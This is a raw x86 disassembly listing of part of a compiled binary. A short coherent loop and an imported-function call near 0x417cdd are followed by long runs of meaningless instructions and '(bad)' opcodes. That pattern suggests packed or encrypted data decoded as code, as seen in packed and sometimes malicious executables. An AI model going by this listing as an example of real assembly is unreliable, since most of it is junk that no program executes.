  417c83:	cmp    ch,BYTE PTR [eax-0x61e61319]
  417c89:	ins    DWORD PTR es:[edi],dx
  417c8a:	jmp    0x417c6f
  417c8c:	pop    ebx
  417c8d:	and    al,0x10
  417c8f:	gs mov esp,0x25bd1847
  417c95:	int3   
  417c96:	xchg   ebp,eax
  417c97:	cmp    DWORD PTR [ebx-0x791abbbe],0xffffffcd
  417c9e:	mov    al,fs:0xf9ffd40
  417ca4:	and    eax,0xc8ea2559
  417ca9:	cwde   
  417caa:	int3   
  417cab:	push   0x4d546cc0
  417cb0:	push   es
  417cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cb2:	pop    es
  417cb3:	outs   dx,BYTE PTR ds:[esi]
  417cb4:	seta   BYTE PTR [ebx-0x1bf3f238]
  417cbb:	scas   eax,DWORD PTR es:[edi]
  417cbc:	lock mov al,ds:0x832f5dc9
  417cc2:	push   0xfffffff7
  417cc4:	div    DWORD PTR [esi]
  417cc6:	push   ebp
  417cc7:	jne    0x417ca6
  417cc9:	loop   0x417ceb
  417ccb:	mov    eax,ds:0xd2fa4110
  417cd0:	adc    al,0x8b
  417cd2:	add    edx,ecx
  417cd4:	sub    edi,DWORD PTR ds:0x42a3fd
  417cda:	mov    DWORD PTR [ebp-0x8],edx
  417cdd:	mov    DWORD PTR ds:0x42a379,0x16
  417ce7:	cmp    DWORD PTR ds:0x42a379,0x0
  417cee:	je     0x417d21
  417cf4:	cmp    DWORD PTR ds:0x42a379,0x24
  417cfb:	jne    0x417d0f
  417d01:	push   DWORD PTR [ebp-0x28]
  417d04:	push   0x42a3c1
  417d09:	call   DWORD PTR ds:0x4251e0
  417d0f:	mov    edi,DWORD PTR ds:0x42a379
  417d15:	dec    edi
  417d16:	mov    DWORD PTR ds:0x42a379,edi
  417d1c:	jmp    0x417ce7
  417d21:	mov    edx,DWORD PTR [ebp+0x8]
  417d24:	mov    DWORD PTR ds:0x42a381,0x4d18
  417d2e:	jmp    0x418240
  417d33:	into   
  417d34:	(bad)
  417d38:	(bad)  
  417d39:	(bad)  
  417d3b:	xchg   edi,ebp
  417d3d:	push   ebx
  417d3e:	call   0x83408057
  417d43:	aas    
  417d44:	fidivr DWORD PTR [edi+0x78]
  417d47:	jae    0x417dc5
  417d49:	js     0x417dc3
  417d4b:	leave  
  417d4c:	sbb    BYTE PTR cs:[eax],ch
  417d4f:	mov    ebp,DWORD PTR [edi+0x3a]
  417d52:	pushf  
  417d53:	mov    al,dl
  417d55:	sbb    bl,dh
  417d57:	or     eax,0xb6b29c20
  417d5c:	aaa    
  417d5d:	and    cl,BYTE PTR [esi]
  417d5f:	sbb    al,0xbf
  417d61:	repz jne 0x417dbf
  417d64:	xor    al,0xf5
  417d66:	mov    dh,0xee
  417d68:	ret    
  417d69:	sbb    bl,bh
  417d6b:	or     dh,cl
  417d6d:	jne    0x417d08
  417d6f:	lods   eax,DWORD PTR ds:[esi]
  417d70:	pushf  
  417d71:	jl     0x417d3f
  417d73:	or     ecx,DWORD PTR [edi]
  417d75:	loopne 0x417de9
  417d77:	dec    edx
  417d78:	retf   
  417d79:	popa   
  417d7a:	adc    al,0x4f
  417d7c:	popa   
  417d7d:	xor    dl,ch
  417d7f:	fidiv  DWORD PTR [ecx-0x59cbf67f]
  417d85:	xchg   edx,eax
  417d86:	push   0x17
  417d88:	push   ebx
  417d89:	outs   dx,BYTE PTR ds:[esi]
  417d8a:	adc    cl,0xd0
  417d8d:	or     DWORD PTR [eax],ebx
  417d8f:	or     al,0x96
  417d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d92:	out    0x72,al
  417d94:	int    0x4d
  417d96:	scas   eax,DWORD PTR es:[edi]
  417d97:	sbb    DWORD PTR [ecx],0xffffffd1
  417d9a:	mov    ebx,0x65dd6dc2
  417d9f:	loope  0x417dcb
  417da1:	test   al,0x51
  417da3:	daa    
  417da4:	inc    edx
  417da5:	bswap  eax
  417da7:	imul   edx,DWORD PTR ds:0x64915ce8,0xffffffd9
  417dae:	inc    esp
  417daf:	add    bh,bh
  417db1:	sbb    DWORD PTR [edx+0x6b50209c],esp
  417db7:	shl    BYTE PTR [ecx+0x6545c4f4],cl
  417dbd:	ds loop 0x417d60
  417dc0:	mov    dh,BYTE PTR [esi-0x33]
  417dc3:	repnz test BYTE PTR [ecx-0x3c],al
  417dc7:	inc    ecx
  417dc8:	fiadd  DWORD PTR [edi+0x50872450]
  417dce:	mov    bh,0xc7
  417dd0:	pusha  
  417dd1:	(bad)  
  417dd2:	fiadd  DWORD PTR [edi]
  417dd4:	push   ss
  417dd5:	cmp    DWORD PTR [ecx-0x25],0x3d6d624c
  417ddc:	mov    gs,WORD PTR [edx+0xe]
  417ddf:	fcomp  QWORD PTR [ebp+0x54]
  417de2:	adc    DWORD PTR [ecx-0x6048edd9],ecx
  417de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de9:	dec    eax
  417dea:	mov    ds:0xce436058,eax
  417def:	add    BYTE PTR [esi+0x5f2ece9b],dh
  417df5:	popa   
  417df6:	fmul   DWORD PTR [ecx]
  417df8:	push   edi
  417df9:	xchg   esp,eax
  417dfa:	and    eax,0x6d31eb7
  417dff:	push   eax
  417e00:	add    al,0x29
  417e02:	jno    0x417db2
  417e04:	je     0x417da7
  417e06:	and    eax,0xab195911
  417e0b:	scas   ax,WORD PTR es:[edi]
  417e0d:	pop    ebx
  417e0e:	cdq    
  417e0f:	jmp    0x8fe6:0xad6913cc
  417e16:	mov    bl,0x9a
  417e18:	shl    DWORD PTR [esi-0x32aba964],cl
  417e1e:	inc    edx
  417e1f:	enter  0x8b6b,0x38
  417e23:	arpl   WORD PTR [ecx+0x736f9087],bp
  417e29:	aas    
  417e2a:	ins    DWORD PTR es:[edi],dx
  417e2b:	(bad)  
  417e2c:	sub    ebp,DWORD PTR [ecx]
  417e2e:	out    0x7d,eax
  417e30:	mov    esi,0xe4c2c68
  417e35:	or     eax,DWORD PTR [edi+0x48]
  417e38:	cli    
  417e39:	dec    esi
  417e3a:	pop    esp
  417e3b:	ret    0x2783
  417e3e:	inc    edi
  417e3f:	push   esi
  417e40:	sbb    eax,0xfbc87e0c
  417e45:	pushf  
  417e46:	mov    esp,0x9c9291a2
  417e4b:	daa    
  417e4c:	pop    eax
  417e4d:	xchg   esi,eax
  417e4e:	jo     0x417e51
  417e50:	push   eax
  417e51:	jecxz  0x417e64
  417e53:	pop    eax
  417e54:	ret    0x471e
  417e57:	push   ebp
  417e58:	in     eax,dx
  417e59:	add    eax,edx
  417e5b:	das    
  417e5c:	mov    edi,0x4f00631a
  417e61:	aaa    
  417e62:	scas   eax,DWORD PTR es:[edi]
  417e63:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e65:	div    BYTE PTR [ebx]
  417e67:	cmp    DWORD PTR [edi+eax*4+0x778249ff],edx
  417e6e:	mov    al,0xf9
  417e70:	bnd jl 0x417e20
  417e73:	and    ah,BYTE PTR [edx+ecx*2+0x290ab497]
  417e7a:	push   eax
  417e7b:	lds    edx,FWORD PTR [edi+0x1a9637c4]
  417e81:	dec    ebx
  417e82:	ret    
  417e83:	mov    ah,0x12
  417e85:	push   ebp
  417e86:	fbstp  TBYTE PTR es:[si-0x3511]
  417e8c:	pop    ecx
  417e8d:	sub    ecx,esp
  417e8f:	and    BYTE PTR [ebp+0x70af5b10],bh
  417e95:	pop    eax
  417e96:	outs   dx,BYTE PTR ds:[esi]
  417e97:	lds    ebx,FWORD PTR [esi+0x28]
  417e9a:	leave  
  417e9b:	add    esp,DWORD PTR [ebp-0x30]
  417e9e:	mov    ebx,0xbaef2f38
  417ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ea4:	adc    ecx,DWORD PTR [ecx+0x3e]
  417ea7:	aaa    
  417ea8:	mov    ebx,DWORD PTR [esi+0x4c]
  417eab:	push   0xffffffcd
  417ead:	mov    ?,WORD PTR ss:[ebp+0x4b]
  417eb1:	cli    
  417eb2:	in     eax,dx
  417eb3:	test   al,0x16
  417eb5:	pusha  
  417eb6:	in     al,0x38
  417eb8:	out    dx,eax
  417eb9:	jl     0x417eeb
  417ebb:	mov    ds:0xc21ff718,al
  417ec0:	or     ecx,DWORD PTR [edx]
  417ec2:	jmp    0x417e51
  417ec4:	adc    al,0xea
  417ec6:	aas    
  417ec7:	mov    eax,ds:0x76090d56
  417ecc:	rcr    bl,1
  417ece:	(bad)  
  417ecf:	mov    ecx,0x449b82f3
  417ed4:	loope  0x417efe
  417ed6:	bnd jne 0x417f54
  417ed9:	xchg   ebx,eax
  417eda:	(bad)  
  417edb:	cmp    ecx,ebx
  417edd:	ror    DWORD PTR [ebp+0x22],cl
  417ee0:	and    ebx,ebp
  417ee2:	mov    esi,DWORD PTR [eax]
  417ee4:	xchg   edi,eax
  417ee5:	in     eax,0x88
  417ee7:	and    al,0xe1
  417ee9:	scas   eax,DWORD PTR es:[edi]
  417eea:	stos   BYTE PTR es:[edi],al
  417eeb:	iret   
  417eec:	push   cs
  417eed:	adc    eax,0x3688a495
  417ef2:	mov    BYTE PTR [edx-0x48caf938],cl
  417ef8:	jl     0x417f24
  417efa:	add    al,0x9f
  417efc:	sbb    eax,0x810fccc
  417f01:	mov    dh,0x7e
  417f03:	fist   WORD PTR [ebp+0x61d09022]
  417f09:	sbb    DWORD PTR [edx+0x15],0xffffff9f
  417f0d:	xchg   ecx,eax
  417f0e:	clc    
  417f0f:	adc    dh,BYTE PTR [edi+eiz*2]
  417f12:	ror    DWORD PTR [edx+0x21dde804],0x90
  417f19:	pop    edi
  417f1a:	sub    esi,esi
  417f1c:	arpl   WORD PTR [ebx+0x205143a],bp
  417f22:	lock cwde 
  417f24:	hlt    
  417f25:	inc    ebx
  417f26:	jp     0x417ee3
  417f28:	inc    edi
  417f29:	xor    DWORD PTR [esp+ecx*8-0x53],esi
  417f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f2e:	jmp    0x417ede
  417f30:	lods   eax,DWORD PTR ds:[esi]
  417f31:	dec    eax
  417f32:	fs dec ebx
  417f34:	inc    edx
  417f35:	ret    
  417f36:	sub    eax,0xf4b5b9a7
  417f3b:	data16 jle 0x417eec
  417f3e:	push   es
  417f3f:	cmp    ebp,DWORD PTR [ecx-0x50]
  417f42:	call   0x21a9aedf
  417f47:	out    0x5b,eax
  417f49:	cmp    esi,DWORD PTR [ebx]
  417f4b:	mov    edi,0x47225f0d
  417f50:	pop    ebx
  417f51:	jp     0x417f09
  417f53:	fdivr  st(2),st
  417f55:	cld    
  417f56:	(bad)  
  417f58:	icebp  
  417f59:	enter  0x7b03,0x3c
  417f5d:	fsubr  DWORD PTR [ecx]
  417f5f:	xchg   ebp,eax
  417f60:	inc    ebx
  417f61:	shr    DWORD PTR [ecx+0x53],1
  417f64:	arpl   WORD PTR [edx-0x65b1a3e0],bx
  417f6a:	ins    DWORD PTR es:[edi],dx
  417f6b:	fldenv [ebp+0x11115d26]
  417f71:	cld    
  417f72:	in     eax,dx
  417f73:	sti    
  417f74:	cs push 0xfffffffc
  417f77:	lods   eax,DWORD PTR ds:[esi]
  417f78:	dec    esp
  417f79:	push   edi
  417f7a:	stc    
  417f7b:	ins    DWORD PTR es:[edi],dx
  417f7c:	xor    dh,BYTE PTR [edx-0x6dff648f]
  417f82:	mov    dh,0xb0
  417f84:	dec    ebx
  417f85:	fistp  QWORD PTR [esi]
  417f87:	outs   dx,BYTE PTR ds:[esi]
  417f88:	in     eax,dx
  417f89:	scas   al,BYTE PTR es:[edi]
  417f8a:	pop    ebx
  417f8b:	or     ebx,DWORD PTR [ebp-0x616bbb8e]
  417f91:	mov    ds:0x38237a86,eax
  417f96:	cdq    
  417f97:	sbb    DWORD PTR [ebx+0x3709259a],esi
  417f9d:	mov    al,0x43
  417f9f:	ss push ecx
  417fa1:	add    dh,BYTE PTR [eax]
  417fa3:	xchg   BYTE PTR [ebx],bl
  417fa5:	adc    ah,al
  417fa7:	sub    edi,DWORD PTR [edx+0x63]
  417faa:	push   es
  417fab:	stos   DWORD PTR es:[edi],eax
  417fac:	inc    eax
  417fad:	jnp    0x417f60
  417faf:	ja     0x418001
  417fb1:	fldcw  WORD PTR [eax]
  417fb3:	jp     0x417fa0
  417fb5:	hlt    
  417fb6:	mov    ds:0x34adbc74,eax
  417fbb:	jmp    0x417f8d
  417fbd:	frstor [edi+edi*4+0x703fb953]
  417fc4:	jmp    edi
  417fc6:	xchg   esp,eax
  417fc7:	leave  
  417fc8:	cmovge edx,DWORD PTR [eax]
  417fcb:	and    al,0x0
  417fcd:	(bad)  
  417fce:	push   ebp
  417fcf:	ror    BYTE PTR [edx],cl
  417fd1:	jmp    0x41802c
  417fd3:	fistp  QWORD PTR [edx+0x20]
  417fd6:	cmp    bh,BYTE PTR [edx+0x2b5ed0bd]
  417fdc:	xor    al,BYTE PTR [ecx-0x3f]
  417fdf:	out    0x5e,eax
  417fe1:	stos   BYTE PTR es:[edi],al
  417fe2:	jae    0x417ff9
  417fe4:	mov    DWORD PTR [ebx],eax
  417fe6:	or     DWORD PTR [esi-0x3151313],esp
  417fec:	icebp  
  417fed:	loop   0x418016
  417fef:	adc    edi,ebx
  417ff1:	ds push esi
  417ff3:	test   eax,0x5680aa58
  417ff8:	jl     0x418064
  417ffa:	cs mov ebx,0x89e2e0d6
  418000:	add    ch,BYTE PTR [ebx]
  418002:	adc    bl,dh
  418004:	and    al,0x92
  418006:	xor    eax,0x11aa742e
  41800b:	sub    eax,0x4a72a404
  418010:	cli    
  418011:	in     eax,dx
  418012:	mov    edx,esi
  418014:	or     DWORD PTR [ebp+0x219533ee],ebx
  41801a:	sub    al,0xda
  41801c:	jge    0x417fad
  41801e:	das    
  41801f:	push   ebx
  418020:	psubb  mm5,QWORD PTR [eax]
  418023:	pop    eax
  418024:	sub    BYTE PTR [esi+0x7c],bl
  418027:	(bad)  
  418028:	hlt    
  418029:	cmp    DWORD PTR [eax-0x54],ebp
  41802c:	jp     0x417fd1
  41802e:	mov    ?,WORD PTR [ebx+0x59]
  418031:	push   ebx
  418032:	inc    ebp
  418033:	jns    0x418089
  418035:	and    esp,eax
  418037:	and    al,0xca
  418039:	clc    
  41803a:	push   cs
  41803b:	dec    eax
  41803c:	add    eax,0x5e141f9f
  418041:	mov    bh,0xa6
  418043:	(bad)
  418046:	mov    gs,WORD PTR [ecx-0x18]
  418049:	inc    ecx
  41804a:	ret    
  41804b:	add    BYTE PTR [esi],ah
  41804d:	and    edi,DWORD PTR [eax+eiz*1+0x72]
  418051:	sbb    DWORD PTR [ebx],eax
  418053:	iret   
  418054:	rcr    DWORD PTR ds:0x6985ae57,0x4d
  41805b:	jg     0x4180a3
  41805d:	xor    ecx,edx
  41805f:	aam    0x50
  418061:	inc    ecx
  418062:	(bad)  
  418063:	dec    esi
  418064:	pop    ss
  418065:	pop    ebx
  418066:	ins    DWORD PTR es:[edi],dx
  418067:	lock xor BYTE PTR [ebp-0xf600ae6],ah
  41806e:	mov    dl,0x59
  418070:	out    0x11,eax
  418072:	sub    BYTE PTR [ebx],bl
  418074:	sbb    eax,0x2db1c40c
  418079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41807a:	sub    eax,0x25027e00
  41807f:	pop    ebx
  418080:	fldenv [edx]
  418082:	sub    ebp,DWORD PTR [edx-0x35]
  418085:	and    al,0xf
  418087:	xor    BYTE PTR [ecx-0x63],0xfe
  41808b:	ds mov bh,0xc4
  41808e:	aaa    
  41808f:	xchg   ebp,eax
  418090:	pop    ebp
  418091:	mov    bh,0x4e
  418093:	dec    eax
  418094:	ror    BYTE PTR [ebp+0xe],cl
  418097:	popf   
  418098:	cmp    eax,0x820ea3e6
  41809d:	mov    edi,0x947bb948
  4180a2:	add    eax,DWORD PTR [edi+0x33]
  4180a5:	ret    0x19fa
  4180a8:	call   0xe7161ad1
  4180ad:	push   cs
  4180ae:	sahf   
  4180af:	in     eax,dx
  4180b0:	adc    esi,DWORD PTR [edi]
  4180b2:	repnz (bad) [edx]
  4180b5:	xor    eax,0xaf7af33f
  4180ba:	test   DWORD PTR [esi+0x2fa68df2],ebp
  4180c0:	cs cld 
  4180c2:	imul   eax,DWORD PTR [esi-0x2a46dcc7],0x8b2f8bcd
  4180cc:	bts    DWORD PTR [esi-0x41],ecx
  4180d0:	cmp    eax,0xfb99b000
  4180d5:	pop    ecx
  4180d6:	dec    ecx
  4180d7:	call   0xbef20a84
  4180dc:	loop   0x418110
  4180de:	mov    dh,0xe0
  4180e0:	div    BYTE PTR [edx]
  4180e2:	xor    eax,0x23d7b55a
  4180e7:	add    eax,0x4cf05545
  4180ec:	jge    0x418117
  4180ee:	test   al,0xd1
  4180f0:	pushf  
  4180f1:	inc    esp
  4180f2:	push   edx
  4180f3:	jbe    0x4180af
  4180f5:	inc    esp
  4180f6:	mov    eax,0xdb15cdc3
  4180fb:	and    DWORD PTR [edx-0x4d],ebx
  4180fe:	lock loope 0x41815b
  418101:	xor    BYTE PTR [esi+0x28f5c79a],ah
  418107:	adc    al,0x9a
  418109:	inc    esp
  41810a:	pop    esp
  41810b:	push   edx
  41810c:	out    0x3d,eax
  41810e:	in     eax,0x3d
  418110:	jbe    0x4180c3
  418112:	jns    0x418173
  418114:	and    esp,DWORD PTR [eax-0x70]
  418117:	push   edx
  418118:	out    0x30,al
  41811a:	je     0x418109
  41811c:	cmp    dh,BYTE PTR [ebp+0x22]
  41811f:	les    edi,FWORD PTR [edx]
  418121:	ret    0x8e1
  418124:	(bad)  
  418125:	out    dx,eax
  418126:	mov    ch,0x5
  418128:	adc    al,0xae
  41812a:	xchg   esi,eax
  41812b:	imul   edi,DWORD PTR [ebx-0x1c],0x82e47300
  418132:	inc    ecx
  418133:	jp     0x418105
  418135:	nop
  418136:	ins    DWORD PTR es:[edi],dx
  418137:	pop    ecx
  418138:	ret    0xbeac
  41813b:	dec    edx
  41813c:	xor    ebx,DWORD PTR [ebx-0x39f0d25f]
  418142:	jmp    0xedd22a9a
  418147:	add    eax,0x91a33540
  41814c:	or     BYTE PTR [ecx],bh
  41814e:	pop    eax
  41814f:	es cwde 
  418151:	(bad)  
  418152:	sub    dh,BYTE PTR [edx+0x14]
  418155:	sti    
  418156:	xchg   ebp,eax
  418157:	(bad)  
  418158:	jno    0x4181cd
  41815a:	clc    
  41815b:	enter  0x51c3,0xe6
  41815f:	fstp   QWORD PTR [ebp-0x40c443ab]
  418165:	daa    
  418166:	sub    ebx,edi
  418168:	or     cl,bh
  41816a:	imul   ecx,DWORD PTR [eax],0x71c4c04
  418170:	in     al,0xee
  418172:	cld    
  418173:	adc    BYTE PTR [ebp+edx*2-0x49],0x73
  418178:	xor    bl,BYTE PTR [edi]
  41817a:	push   0xffffffcd
  41817c:	test   DWORD PTR [ebx],esp
  41817e:	stos   BYTE PTR es:[edi],al
  41817f:	adc    ah,cl
  418181:	les    edi,FWORD PTR [ecx-0x5d549a41]
  418187:	ficomp DWORD PTR [esi]
  418189:	test   BYTE PTR [ecx],al
  41818b:	lds    edi,FWORD PTR [eax+0x3b]
  41818e:	xor    eax,esp
  418190:	adc    dl,bh
  418192:	sub    BYTE PTR [ecx-0x71],dh
  418195:	repz xchg ebp,eax
  418197:	add    DWORD PTR [esi+0x6a8b1d10],edx
  41819d:	repnz aad 0xd8
  4181a0:	fbld   TBYTE PTR [eax+0x2d]
  4181a3:	jmp    0x418188
  4181a5:	aam    0x2b
  4181a7:	sti    
  4181a8:	sbb    eax,0x5b3f6f32
  4181ad:	pop    ss
  4181ae:	jg     0x4181f7
  4181b0:	cwde   
  4181b1:	retf   
  4181b2:	rcr    dl,cl
  4181b4:	cli    
  4181b5:	fdivrp st(1),st
  4181b7:	lahf   
  4181b8:	push   ebp
  4181b9:	push   ebx
  4181ba:	push   0x9
  4181bc:	inc    ebp
  4181bd:	arpl   si,dx
  4181bf:	jp     0x4181ee
  4181c1:	adc    edi,DWORD PTR [ecx-0x4fc1da52]
  4181c7:	(bad)  
  4181c8:	pop    ss
  4181c9:	fnsave [ebx]
  4181cb:	call   0xf933c50c
  4181d0:	(bad)  
  4181d1:	mov    ebx,0x3a6312a9
  4181d6:	out    0x9e,al
  4181d8:	add    BYTE PTR [edx+0x7c8f7f97],bh
  4181de:	loopne 0x418211
  4181e0:	cs and eax,0x7e5f755b
  4181e6:	fwait
  4181e7:	xchg   DWORD PTR [eax],esp
  4181e9:	in     eax,dx
  4181ea:	mov    ecx,0xb569a76
  4181ef:	mov    esi,0x6960db2
  4181f4:	jp     0x41825f
  4181f6:	outs   dx,DWORD PTR ds:[esi]
  4181f7:	push   cs
  4181f8:	jmp    0xebb79693
  4181fd:	pop    ss
  4181fe:	cld    
  4181ff:	push   ss
  418200:	add    DWORD PTR [esi+ebp*4-0x3805e4d3],0x371135aa
  41820b:	into   
  41820c:	pop    ebp
  41820d:	aas    
  41820e:	dec    ecx
  41820f:	jge    0x41821d
  418211:	mov    ch,0x8c
  418213:	xchg   esp,eax
  418214:	add    bl,BYTE PTR ds:0xf90073a9
  41821a:	jmp    0x96df:0xc25dba82
  418221:	push   edx
  418222:	mov    edi,DWORD PTR [esi+0x26]
  418225:	fadd   st,st(4)
  418227:	jl     0x418267
  418229:	cmp    esp,ebx
  41822b:	outs   dx,DWORD PTR ds:[esi]
  41822c:	out    0x57,eax
  41822e:	frstor [esi+esi*4-0x65fee047]
  418235:	sub    BYTE PTR [ebp+ecx*1-0x14968147],cl
  41823c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41823d:	std    
  41823e:	adc    BYTE PTR [edi+0x33],dh
  418241:	shl    BYTE PTR [ebx],1
  418243:	push   DWORD PTR [ebx]
  418245:	cmp    eax,0x42a371
  41824a:	and    DWORD PTR ds:0x42a3c9,edi
  418250:	jmp    0x418762
  418255:	int3   
  418256:	aas    
  418257:	into   
  418258:	rcl    ecx,0xd1
  41825b:	ror    ebp,cl
  41825d:	(bad)  
  41825e:	shl    DWORD PTR [eax+esi*8],1
  418261:	xchg   edx,eax
  418262:	push   ecx
  418263:	xor    DWORD PTR [edi+0x787fdd32],0x78787c73
  41826d:	in     eax,0xfc
  41826f:	pop    eax
  418270:	xchg   esp,eax
  418271:	es je  0x41820f
  418274:	or     DWORD PTR [ebp-0x12],edi
  418277:	cdq    
  418278:	pushf  
  418279:	retf   
  41827a:	sub    edi,ecx
  41827c:	xchg   esi,eax
  41827d:	je     0x4182b1
  41827f:	leave  
  418280:	js     0x418241
  418282:	cld    
  418283:	mov    edx,0x50ca7c2a
  418288:	mov    dh,0x79
  41828a:	xor    ch,BYTE PTR [ebp+0x716cbc25]
  418290:	sub    al,0x27
  418292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418293:	jmp    0xba3204bf
  418298:	cmc    
  418299:	mov    eax,ecx
  41829b:	stc    
  41829c:	not    edi
  41829e:	mov    ebp,0x986da043
  4182a3:	mov    edx,DWORD PTR [edi]
  4182a5:	mov    bl,0x4
  4182a7:	in     al,dx
  4182a8:	fdivr  QWORD PTR [edx+edx*8+0x7aadfe14]
  4182af:	mov    dl,0x7a
  4182b1:	fdivr  st,st(7)
  4182b3:	sbb    al,BYTE PTR [edi+0x4f980faf]
  4182b9:	push   edi
  4182ba:	push   DWORD PTR [ecx+0x2f97968b]
  4182c0:	shl    DWORD PTR [ebp+edx*2-0x38],1
  4182c4:	out    0xfa,al
  4182c6:	xchg   edi,eax
  4182c7:	idiv   BYTE PTR [ecx-0x8]
  4182ca:	add    DWORD PTR [edx+0x8cd4a72],edx
  4182d0:	clc    
  4182d1:	adc    esi,eax
  4182d3:	mov    al,0x94
  4182d5:	pop    es
  4182d6:	shl    BYTE PTR [edi],1
  4182d8:	push   es
  4182d9:	cmp    DWORD PTR [esi+0x72],0xfffffff2
  4182dd:	and    edi,DWORD PTR [edx]
  4182df:	fnstcw WORD PTR [ebx]
  4182e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182e2:	pop    eax
  4182e3:	pop    ecx
  4182e4:	mov    dl,0x18
  4182e6:	lods   eax,DWORD PTR ds:[esi]
  4182e7:	jle    0x4182ea
  4182e9:	push   edi
  4182ea:	mov    esp,0x22ee71be
  4182ef:	or     ecx,ecx
  4182f1:	mov    bh,0x93
  4182f3:	xor    al,0xcd
  4182f5:	rcl    BYTE PTR [eax-0xf859392],cl
  4182fb:	fistp  DWORD PTR [ecx-0x25]
  4182fe:	loopne 0x4182cb
  418300:	xor    eax,0x1b4939b8
  418305:	sbb    dl,BYTE PTR ds:0x1edf137
  41830b:	adc    DWORD PTR [edi-0x2c388026],edx
  418311:	stos   BYTE PTR es:[edi],al
  418312:	in     eax,dx
  418313:	std    
  418314:	std    
  418315:	rcr    DWORD PTR [ebp+edx*1-0x7e],0x41
  41831a:	cmp    al,0x6e
  41831c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41831d:	xor    eax,0x9d3920fc
  418322:	jae    0x4182f0
  418324:	sbb    BYTE PTR [ecx-0x69],al
  418327:	rep lods al,BYTE PTR ds:[esi]
  418329:	jecxz  0x418304
  41832b:	mov    ds:0xf900cbac,eax
  418330:	xor    BYTE PTR [edi],0x7c
  418333:	mov    al,0xc6
  418335:	lods   eax,DWORD PTR ds:[esi]
  418336:	sbb    ebp,DWORD PTR [ebp+ebp*8-0x743e98c9]
  41833d:	inc    edx
  41833e:	jle    0x418358
  418340:	and    ch,cl
  418342:	mov    DWORD PTR [eax-0x2b4a9501],eax
  418348:	sbb    BYTE PTR [edi],al
  41834a:	test   al,0xbb
  41834c:	ss fdivr st,st(2)
  41834f:	jo     0x41830f
  418351:	cdq    
  418352:	jl     0x418380
  418354:	adc    al,0x3f
  418356:	or     edi,eax
  418358:	or     dh,BYTE PTR [eax+0x185e762a]
  41835e:	add    DWORD PTR [edi+edx*2],ebx
  418361:	in     eax,0xb5
  418363:	inc    eax
  418364:	xchg   edx,eax
  418365:	pop    esi
  418366:	in     al,0x87
  418368:	mov    eax,0xdd2392d6
  41836d:	and    DWORD PTR [edi-0x641e57fd],esi
  418373:	xor    BYTE PTR [ebx+0x223924c3],cl
  418379:	mov    ds:0x434698a5,al
  41837e:	fcomp  DWORD PTR [edi]
  418380:	jmp    0x4183bd
  418382:	and    eax,DWORD PTR [ebx-0x1d]
  418385:	jle    0x4183d7
  418387:	fisub  DWORD PTR [ebp-0x11]
  41838a:	(bad)  
  41838b:	gs push 0x9019d75c
  418391:	jl     0x41832f
  418393:	xor    eax,DWORD PTR [ebp+0x652ff8e2]
  418399:	fcom   st(0)
  41839b:	jae    0x4183f0
  41839d:	addr16 adc eax,ecx
  4183a0:	or     edi,DWORD PTR ds:0xdebbe935
  4183a6:	jno    0x4183e1
  4183a8:	mov    esp,0x2a25620d
  4183ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183ae:	in     eax,0x5d
  4183b0:	sbb    cl,al
  4183b2:	sahf   
  4183b3:	ss std 
  4183b5:	xchg   ebp,eax
  4183b6:	mov    dl,0x67
  4183b8:	jae    0x41834a
  4183ba:	push   0xc83f0ba0
  4183bf:	jle    0x418435
  4183c1:	and    BYTE PTR [ecx],0xed
  4183c4:	adc    eax,0x4e0b14d
  4183c9:	sub    BYTE PTR [esp+edi*4-0x3e1197a3],bl
  4183d0:	adc    bh,BYTE PTR [ebx+esi*1+0x1b]
  4183d4:	(bad)  [ecx+edx*4-0x41]
  4183d8:	lock dec DWORD PTR [ecx+0x4]
  4183dc:	outs   dx,BYTE PTR ds:[esi]
  4183dd:	aaa    
  4183de:	push   0xffffffa4
  4183e0:	icebp  
  4183e1:	hlt    
  4183e2:	mov    al,0x90
  4183e4:	cmp    ebp,DWORD PTR [ebx-0x16]
  4183e7:	ret    
  4183e8:	outs   dx,DWORD PTR ds:[esi]
  4183e9:	add    ax,0xf463
  4183ed:	sbb    BYTE PTR [edi+0x6d246ecf],cl
  4183f3:	push   0xffffffcc
  4183f5:	inc    edx
  4183f6:	imul   edx,DWORD PTR [esi],0x16
  4183f9:	(bad)  
  4183fa:	lods   al,BYTE PTR ds:[esi]
  4183fb:	adc    DWORD PTR [esi+0x5122f4e7],edx
  418401:	aad    0x75
  418403:	xchg   esp,eax
  418404:	test   al,0xc7
  418406:	mov    ds:0x340b07a0,eax
  41840b:	push   esi
  41840c:	pop    edi
  41840d:	add    dl,BYTE PTR [edi+0x5d]
  418410:	hlt    
  418411:	int    0x30
  418413:	xor    al,0x27
  418415:	mov    ebp,0x1d055897
  41841a:	dec    edi
  41841b:	cld    
  41841c:	int3   
  41841d:	pop    ebx
  41841e:	aaa    
  41841f:	mov    ah,BYTE PTR [ebp-0x11]
  418422:	add    al,0xe8
  418424:	enter  0x9add,0xb6
  418428:	cwde   
  418429:	fdiv   QWORD PTR [edi-0x66be70b2]
  41842f:	adc    al,0x0
  418431:	jne    0x418405
  418433:	sbb    eax,0xb9826241
  418438:	sti    
  418439:	cmp    BYTE PTR [edx-0x35b23b5d],bl
  41843f:	pop    ebx
  418440:	and    BYTE PTR ds:0x61e998df,dl
  418446:	in     al,dx
  418447:	xchg   ebx,eax
  418448:	nop
  418449:	fs add esi,edx
  41844c:	lahf   
  41844d:	cmp    DWORD PTR ds:0xd028bfe2,ebp
  418453:	mov    ?,WORD PTR [eax+0xbd374fd]
  418459:	mov    ecx,0x6b0b6832
  41845e:	cli    
  41845f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418460:	test   DWORD PTR [esp+ebx*8],edi
  418463:	adc    cl,BYTE PTR [ebx+0x601dc18]
  418469:	cmp    al,0x7d
  41846b:	jo     0x418421
  41846d:	pop    ebp
